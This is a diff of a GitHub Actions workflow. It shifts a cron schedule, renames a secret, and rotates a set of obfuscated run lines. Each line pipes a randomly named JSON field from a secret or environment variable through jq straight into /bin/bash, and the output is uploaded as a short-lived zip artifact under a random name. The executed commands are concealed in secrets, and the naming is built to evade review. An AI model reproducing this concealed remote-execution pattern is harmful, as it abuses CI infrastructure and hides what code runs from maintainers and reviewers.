@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '39 3,9,15,21 * * *'
+    - cron: '44 4,10,16,22 * * *'
 permissions:
   contents: read
   actions: read
@@ -16,20 +16,16 @@ jobs:
         uses: actions/checkout@v4
       - name: Run
         env:
-          wqldz89294: ${{ secrets.wqldz89294 }}
+          qg3: ${{ secrets.qg3 }}
         run: |
-          printf '%s' "$wqldz89294" | jq -r .f604 | /bin/bash
-          printf '%s' "$go2904" | jq -r .sgmgk17457 | /bin/bash
-          echo $fxs7 | jq -r .pf888 | /bin/bash
-          echo $keekx74927 | jq -r .wiov6515 | /bin/bash
-          echo $fn8 | jq -r .zp1947 | /bin/bash
-          printf '%s' "$qeckt50" | jq -r .sdg1 | /bin/bash
-          echo $skyo147 | jq -r .zfhxb3 | /bin/bash
-          printf '%s' "$v49208" | jq -r .nima0 | /bin/bash
+          printf '%s' "$qg3" | jq -r .guzmt8 | /bin/bash
+          echo $ipukw20 | jq -r .rwuh0877 | /bin/bash
+          printf '%s' "$pyd7925" | jq -r .lebks2663 | /bin/bash
+          echo $io9508 | jq -r .d316 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: IEI2rpNj
+          name: OrRJDiqi
           path: "*.zip"
           retention-days: 1
